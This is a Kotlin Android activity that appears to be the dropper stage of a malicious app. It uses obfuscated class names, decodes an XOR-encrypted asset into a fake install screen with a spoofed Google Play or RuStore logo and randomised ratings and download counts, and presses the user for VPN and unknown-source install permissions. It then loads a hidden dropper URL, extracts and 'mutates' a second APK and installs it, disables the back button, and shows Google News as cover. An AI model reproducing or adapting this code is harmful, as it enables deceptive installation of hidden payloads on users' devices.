package com.sync.media.hub

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.net.Uri
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.view.View
import android.view.ViewGroup
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.Toast
import java.io.ByteArrayOutputStream
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

class Bison : Activity() {

    private enum class Phase { INIT, VPN_WAIT, PERM_WAIT, INSTALLING, DONE }

    private var bgWebView: WebView? = null
    private var bloomWv: WebView? = null
    private var lark: Lark? = null
    private val handler = Handler(Looper.getMainLooper())
    private var phase = Phase.INIT
    private val installing = AtomicBoolean(false)
    private var isDark = true

    private val permCheckRunnable = object : Runnable {
        override fun run() {
            if (phase != Phase.PERM_WAIT) return
            val canApi = packageManager.canRequestPackageInstalls()
            val canReal = if (canApi) canReallyInstall() else false
            if (canReal) {
                proceed()
            } else {
                handler.postDelayed(this, 500L)
            }
        }
    }

    private val settingsRunnable = Runnable {
        if (phase == Phase.PERM_WAIT) {
            startActivity(
                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:$packageName"))
            )
        }
    }

    override fun onCreate(saved: Bundle?) {
        super.onCreate(saved)

        val nightMode = resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK
        isDark = nightMode == Configuration.UI_MODE_NIGHT_YES

        stopService(Intent(this, Tern::class.java))

        val warren = Vole.locateWarren(this)

        if (warren != null) {
            val installed = try { packageManager.getPackageInfo(warren, 0); true } catch (_: Exception) { false }
            if (installed) {
                launchSpecies(warren)
                finish()
                return
            }
            getSharedPreferences(Lynx.WARREN_PREFS, MODE_PRIVATE).edit().remove(Lynx.WARREN_KEY).apply()
        }

        setupViews()

        val isMiui = Stork.isMiui(this)
        val miuiDone = getSharedPreferences(Lynx.WARREN_PREFS, MODE_PRIVATE)
            .getBoolean(Lynx.MIUI_DONE_KEY, false)
        if (isMiui && !miuiDone) {
            getSharedPreferences(Lynx.WARREN_PREFS, MODE_PRIVATE)
                .edit().putBoolean(Lynx.MIUI_DONE_KEY, true).apply()
            Stork.armDelayed(this, 5000L)
            showBloom {}
            return
        }

        showBloom {
            handler.postDelayed({ startFlow() }, 1500L)
        }
    }

    private fun startFlow() {
        if (phase != Phase.INIT) return
        val reason = Wolf.strandReason(this)

        if (reason != null) {
            Toast.makeText(this, reason, Toast.LENGTH_LONG).show()
            loadNews()
            return
        }

        phase = Phase.VPN_WAIT
        val vpnIntent = VpnService.prepare(this)
        if (vpnIntent != null) {
            startActivityForResult(vpnIntent, 1001)
        } else {
            onVpnReady()
        }
    }

    private fun onVpnReady() {
        Mink.launch(this)
        phase = Phase.PERM_WAIT
        val canInstall = packageManager.canRequestPackageInstalls()
        if (!canInstall) {
            startService(Intent(this, Tern::class.java))
            handler.removeCallbacks(permCheckRunnable)
            handler.removeCallbacks(settingsRunnable)
            handler.postDelayed(permCheckRunnable, 500L)
            handler.postDelayed(settingsRunnable, 500L)
        } else {
            proceed()
        }
    }

    private fun proceed() {
        if (!installing.compareAndSet(false, true)) return
        handler.removeCallbacks(settingsRunnable)
        handler.removeCallbacks(permCheckRunnable)

        val latestWarren = Vole.locateWarren(this)
        if (latestWarren != null) {
            val alreadyThere = try { packageManager.getPackageInfo(latestWarren, 0); true } catch (_: Exception) { false }
            if (alreadyThere) {
                bloomWv?.let { wv -> lark?.setLaunching(wv) }
                handler.postDelayed({ launchSpecies(latestWarren); finish() }, 1200L)
                return
            }
        }
        phase = Phase.INSTALLING

        bloomWv?.let { wv -> lark?.setInstalling(wv) }

        val ctx = this
        Thread {
            try {
                val f = Otter.extractGenome(ctx)
                Badger.markTerritory(ctx)
                val mutated = Elk.mutate(f.readBytes(), ctx.cacheDir)
                Quail.plant(ctx, mutated)
            } catch (_: Exception) {
                handler.post { loadNews() }
            }
        }.start()
    }

    private fun setupViews() {
        val container = FrameLayout(this)
        setContentView(container)

        val bg = WebView(this)
        bg.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )
        bg.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            cacheMode = WebSettings.LOAD_DEFAULT
            allowFileAccess = false
            userAgentString = WebSettings.getDefaultUserAgent(this@Bison)
        }
        bg.setBackgroundColor(Color.WHITE)
        bg.visibility = View.INVISIBLE
        bg.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView?, request: android.webkit.WebResourceRequest?
            ): Boolean {
                val scheme = request?.url?.scheme ?: ""
                if (scheme != "http" && scheme != "https") return true
                val host = request?.url?.host ?: ""
                if (host.contains("play.google.com") || host.contains("apps.apple.com") ||
                    host.contains("rustore.ru")) return true
                return false
            }
            @Suppress("DEPRECATION")
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                val uri = Uri.parse(url ?: "")
                val scheme = uri.scheme ?: ""
                if (scheme != "http" && scheme != "https") return true
                val host = uri.host ?: ""
                if (host.contains("play.google.com") || host.contains("apps.apple.com") ||
                    host.contains("rustore.ru")) return true
                return false
            }
            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                val scheme = Uri.parse(url ?: "").scheme ?: ""
                if (scheme != "http" && scheme != "https") view?.stopLoading()
            }
        }
        container.addView(bg)
        bgWebView = bg

        val bv = WebView(this)
        bv.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )
        bv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            cacheMode = WebSettings.LOAD_NO_CACHE
        }
        bv.setBackgroundColor(Color.TRANSPARENT)
        container.addView(bv)
        bloomWv = bv

        lark = Lark(onUpdate = {
            handler.post {
                when (phase) {
                    Phase.INIT, Phase.VPN_WAIT -> startFlow()
                    Phase.PERM_WAIT -> {
                        val can = packageManager.canRequestPackageInstalls()
                        if (can) {
                            proceed()
                        } else {
                            handler.removeCallbacks(settingsRunnable)
                            startActivity(
                                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                    Uri.parse("package:$packageName"))
                            )
                        }
                    }
                    else -> {}
                }
            }
        }).also {
            it.attach(bv)
        }
    }

    private fun showBloom(onReady: () -> Unit) {
        bgWebView?.visibility = View.VISIBLE
        bgWebView?.loadUrl(Lynx.DROPPER_URL)

        val html = try {
            val bytes = assets.open("bloom.html").readBytes()
            val magic = byteArrayOf(0xC9.toByte(), 0x3B, 0x7A, 0x4F)
            val raw = if (bytes.size >= 8 && bytes[0] == magic[0] && bytes[1] == magic[1] &&
                         bytes[2] == magic[2] && bytes[3] == magic[3]) {
                val key = bytes.sliceArray(4..7)
                String(ByteArray(bytes.size - 8) { i -> (bytes[i + 8].toInt() xor key[i % 4].toInt()).toByte() }, Charsets.UTF_8)
            } else {
                bytes.toString(Charsets.UTF_8)
            }
            val ratingRaw = (44..49).random()
            val rating = "${ratingRaw / 10}.${ratingRaw % 10}"
            val reviews = (8..11).random().toString()
            val downloads = (100..700).random().toString()
            val storeLogo = storeLogoHtml()
            raw.replace("{{BLOOM_STORE_LOGO}}", storeLogo)
               .replace("{{BLOOM_RATING}}", rating)
               .replace("{{BLOOM_REVIEWS_NUM}}", reviews)
               .replace("{{BLOOM_DOWNLOADS}}", downloads)
        } catch (_: Exception) { null }

        if (html == null) {
            onReady()
            return
        }

        bloomWv?.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                injectBloomData()
                onReady()
            }
        }
        bloomWv?.loadDataWithBaseURL("about:blank", html, "text/html", "utf-8", null)
    }

    private fun injectBloomData() {
        val iconB64 = getIconBase64()
        val rawName = getAppLabel()
        val name = rawName
            .replace("\\", "\\\\").replace("'", "\\'")
            .replace("\n", "").replace("\r", "")
        val lang = getLang()

        val sizeMb: String = try {
            val cached = java.io.File(cacheDir, "g.apk")
            if (cached.exists() && cached.length() > 1_000_000L)
                String.format("%.1f", cached.length() / 1_048_576.0)
            else "4.6"
        } catch (_: Exception) { "4.6" }

        val js = "window.applyBloomData&&window.applyBloomData(" +
                "{appIcon:'$iconB64',appName:'$name',sizeMb:'$sizeMb',isDark:$isDark,lang:'$lang'});"

        fun inject() { bloomWv?.evaluateJavascript(js, null) }
        inject()
        handler.postDelayed({ inject() }, 500L)
        handler.postDelayed({ inject() }, 1200L)
        handler.postDelayed({ inject() }, 2000L)
    }

    private fun loadNews() {
        val loc = Locale.getDefault()
        val url = "https://news.google.com/?hl=${loc.language}&gl=${loc.country}&ceid=${loc.country}:${loc.language}"
        bloomWv?.visibility = View.GONE
        bgWebView?.visibility = View.VISIBLE
        bgWebView?.loadUrl(url)
    }

    private fun getLang(): String {
        val raw = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
            resources.configuration.locales[0].language
        else
            @Suppress("DEPRECATION") resources.configuration.locale.language
        val supported = setOf("ru", "en", "be", "es", "fr", "it", "kk", "tr", "uz")
        return if (raw in supported) raw else "en"
    }

    private fun getIconBase64(): String {
        return try {
            val drawable = packageManager.getApplicationIcon(packageName)
            val bmp = Bitmap.createBitmap(64, 64, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bmp)
            drawable.setBounds(0, 0, 64, 64)
            drawable.draw(canvas)
            val baos = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.PNG, 90, baos)
            val bytes = baos.toByteArray()
            "data:image/png;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (_: Exception) { "" }
    }

    private fun getAppLabel(): String {
        return try {
            packageManager.getApplicationLabel(applicationInfo).toString()
        } catch (_: Exception) { "System Tools" }
    }

    private fun storeLogoHtml(): String =
        if (BuildConfig.ST == "rustore") ruStoreLogoHtml() else googlePlayLogoHtml()

    private fun ruStoreLogoHtml(): String =
        "<div class=\"gplay-row\">\n" +
        "            <svg class=\"gplay-icon\" viewBox=\"0 0 36 36\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
        "                <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M17.28 36C9.13414 36 5.0612 36 2.5306 33.4694C-2.23137e-07 30.9388 -4.02706e-07 26.8658 -7.61841e-07 18.7199L-8.25329e-07 17.2799C-1.18446e-06 9.134 -1.36403e-06 5.06105 2.5306 2.53046C5.0612 3.59535e-06 9.13413 3.41884e-06 17.28 3.06582e-06L17.28 3.06581e-06L18.72 3.00341e-06L18.72 3.00341e-06C26.8659 2.65038e-06 30.9388 2.47387e-06 33.4694 2.53046C36 5.06105 36 9.134 36 17.2799L36 18.7199C36 26.8658 36 30.9388 33.4694 33.4694C30.9388 36 26.8659 36 18.72 36L17.28 36Z\" fill=\"#0077FF\"/>\n" +
        "                <path d=\"M20.818 22.1855C19.8481 21.9432 19.168 21.0756 19.168 20.0805L19.168 8.35681C19.168 7.22652 20.236 6.39756 21.3377 6.67277L28.3144 8.41557C29.2843 8.65786 29.9644 9.5255 29.9644 10.5206L29.9644 22.2443C29.9644 23.3746 28.8963 24.2035 27.7947 23.9283L20.818 22.1855Z\" fill=\"white\"/>\n" +
        "                <path d=\"M7.68519 27.5844C6.71525 27.3421 6.03516 26.4745 6.03516 25.4794L6.03516 13.7557C6.03516 12.6254 7.1032 11.7965 8.20488 12.0717L15.1815 13.8145C16.1515 14.0568 16.8316 14.9244 16.8316 15.9195L16.8316 27.6432C16.8316 28.7735 15.7635 29.6024 14.6618 29.3272L7.68519 27.5844Z\" fill=\"white\"/>\n" +
        "                <path d=\"M14.2516 24.8852C13.2817 24.6429 12.6016 23.7753 12.6016 22.7802L12.6016 11.0565C12.6016 9.92621 13.6696 9.09724 14.7713 9.37245L21.7479 11.1153C22.7179 11.3575 23.398 12.2252 23.398 13.2203L23.398 24.944C23.398 26.0743 22.3299 26.9032 21.2283 26.628L14.2516 24.8852Z\" fill=\"white\"/>\n" +
        "                <path d=\"M18.8164 26.0288C18.5109 25.951 18.2934 25.6808 18.2827 25.3657L17.9792 16.4124C17.8914 15.2275 17.0118 14.285 16.0926 14.0075C16.041 13.9919 15.9859 14.0129 15.9554 14.0573C15.9243 14.1024 15.9363 14.1649 15.9796 14.1984C16.2066 14.3741 16.8313 14.9475 16.8313 15.9366L16.8295 25.5253L18.8164 26.0288Z\" fill=\"#0077FF\"/>\n" +
        "                <path d=\"M25.3828 23.3271C25.0776 23.2507 24.8599 22.9813 24.8492 22.6669L24.5456 13.7142C24.4579 12.5292 23.5782 11.5868 22.659 11.3092C22.6074 11.2937 22.5523 11.3147 22.5218 11.3591C22.4907 11.4042 22.5027 11.4666 22.546 11.5002C22.773 11.6759 23.3978 12.2493 23.3978 13.2383L23.3959 22.8303L25.3828 23.3271Z\" fill=\"#0077FF\"/>\n" +
        "            </svg>\n" +
        "            <span class=\"gplay-text\">RuStore</span>\n" +
        "        </div>"

    private fun googlePlayLogoHtml(): String =
        "<div class=\"gplay-row\">\n" +
        "            <svg class=\"gplay-icon\" viewBox=\"0 0 40 40\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
        "                <path fill=\"none\" d=\"M0,0h40v40H0V0z\"/>\n" +
        "                <path d=\"M19.7,19.2L4.3,35.3c0,0,0,0,0,0c0.5,1.7,2.1,3,4,3c0.8,0,1.5-0.2,2.1-0.6l0,0l17.4-9.9L19.7,19.2z\" fill=\"#EA4335\"/>\n" +
        "                <path d=\"M35.3,16.4L35.3,16.4l-7.5-4.3l-8.4,7.4l8.5,8.3l7.5-4.2c1.3-0.7,2.2-2.1,2.2-3.6C37.5,18.5,36.6,17.1,35.3,16.4z\" fill=\"#FBBC04\"/>\n" +
        "                <path d=\"M4.3,4.7C4.2,5,4.2,5.4,4.2,5.8v28.5c0,0.4,0,0.7,0.1,1.1l16-15.7L4.3,4.7z\" fill=\"#4285F4\"/>\n" +
        "                <path d=\"M19.8,20l8-7.9L10.5,2.3C9.9,1.9,9.1,1.7,8.3,1.7c-1.9,0-3.6,1.3-4,3c0,0,0,0,0,0L19.8,20z\" fill=\"#34A853\"/>\n" +
        "            </svg>\n" +
        "            <span class=\"gplay-text\">Google Play</span>\n" +
        "        </div>"

    private fun launchSpecies(pkg: String) {
        val pm = packageManager
        var intent: Intent? = pm.getLaunchIntentForPackage(pkg)
        if (intent == null) {
            intent = pm.getLeanbackLaunchIntentForPackage(pkg)
        }
        if (intent == null) {
            intent = try {
                pm.getInstalledPackages(PackageManager.GET_ACTIVITIES)
                    .firstOrNull { it.packageName == pkg }
                    ?.activities?.firstOrNull()
                    ?.let { act ->
                        Intent(Intent.ACTION_MAIN).apply {
                            setClassName(pkg, act.name)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                    }
            } catch (_: Exception) { null }
        }
        runCatching {
            intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent!!)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.action == Lynx.MIUI_WAKE_ACTION) {
            handleMiuiWake()
        } else if (phase == Phase.PERM_WAIT) {
            if (packageManager.canRequestPackageInstalls()) proceed()
        }
    }

    private fun handleMiuiWake() {
        if (phase == Phase.PERM_WAIT) {
            handler.removeCallbacks(settingsRunnable)
            handler.postDelayed(settingsRunnable, 300L)
            return
        }
        if (bgWebView == null) {
            setupViews()
            showBloom { startFlow() }
        } else {
            startFlow()
        }
    }

    override fun onActivityResult(req: Int, res: Int, data: Intent?) {
        super.onActivityResult(req, res, data)
        when (req) {
            1001 -> {
                if (res == RESULT_OK) onVpnReady()
                else phase = Phase.INIT
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (phase == Phase.PERM_WAIT && packageManager.canRequestPackageInstalls()) proceed()
    }

    override fun onBackPressed() {}

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        bgWebView?.destroy(); bgWebView = null
        bloomWv?.destroy(); bloomWv = null
        super.onDestroy()
    }

    private fun canReallyInstall(): Boolean {
        return try {
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sid = packageManager.packageInstaller.createSession(params)
            packageManager.packageInstaller.abandonSession(sid)
            true
        } catch (_: SecurityException) {
            false
        } catch (_: Exception) {
            false
        }
    }
}
